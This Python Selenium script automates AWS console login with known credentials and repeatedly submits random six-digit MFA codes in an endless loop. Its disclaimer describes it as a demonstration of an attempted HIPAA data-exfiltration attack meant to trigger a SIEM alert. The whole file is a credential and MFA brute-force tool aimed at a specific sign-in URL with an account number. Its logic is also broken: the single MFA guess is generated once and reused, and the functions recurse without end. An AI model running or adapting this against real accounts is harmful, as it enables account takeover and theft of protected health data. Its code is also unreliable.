#!/usr/bin/env python3

##############################################################################
#                          !!!!!!DISCLAIMER!!!!!!                            # 
##############################################################################
# The purpose of this code, is to demonstrate an attempted attack, with the 
# goal of HIPPA Data Exfiltration.

# All testing was done on a conrtolled enviorment to show a SIEM event being
# triggered.

# Only use this code on an enviorment you own.

# PLEASE DO NOT USE THIS CODE FOR NEFARIOUS PURPOSES.

# We do not condone using this for malicious purpose, and are not responsible
# if you are caught using our code for malicious purposes.

##############################################################################
#                               Dogma Inc.                                   #                                     
##############################################################################

##############################################################################
# Import Library                                                             #
##############################################################################
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import random
import time

##############################################################################
# Global Variables                                                           #
##############################################################################
awsUser = 'USERNAME' # known username
awsPass= 'PASSWORD' #known password
mfa=random.randint(000000,999999) # generate random 6 digit number for MFA authentication
browser = webdriver.Chrome()

browser.get(('https://signin.aws.amazon.com/oauth?redirect_uri=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Ffromtb%3Dtrue%26hashArgs%3D%2523%26isauthcode%3Dtrue%26nc2%3Dh_ct%26src%3Dheader-signin%26state%3DhashArgsFromTB_us-east-1_e4cc052dab26faea&client_id=arn%3Aaws%3Asignin%3A%3A%3Aconsole%2Fcanvas&response_type=code&iam_user=true&account=792776145833&code_challenge=IoJhzC-enuflfxE2TK-agHV6C2uDyjfn7NUKTma9Tmo&code_challenge_method=SHA-256&remember_account=false'))
# known login page

##############################################################################
# Global Variables                                                           #
##############################################################################
def awsConsole():
    username = browser.find_element_by_id('username')
    username.send_keys(awsUser)

    password = browser.find_element_by_id('password')
    password.send_keys(awsPass)
    signIN = browser.find_element_by_id('signin_button')
    signIN.click()
    MFA()

def MFA():
    mfaCode = WebDriverWait(browser, 10).until(
        EC.presence_of_element_located((By.NAME, "mfacode")))
    mfaCode.send_keys(mfa)
    mfaSigIN = browser.find_element_by_id('submitMfa_button')
    mfaSigIN.click()
    time.sleep(5) # pause 5 seconds
    username = browser.find_element_by_id('username').clear() # clear username if authentication fails
    awsConsole()
  




##############################################################################
# Main                                                                       #
##############################################################################
if __name__ == '__main__':
    while True:
        awsConsole()

      
       

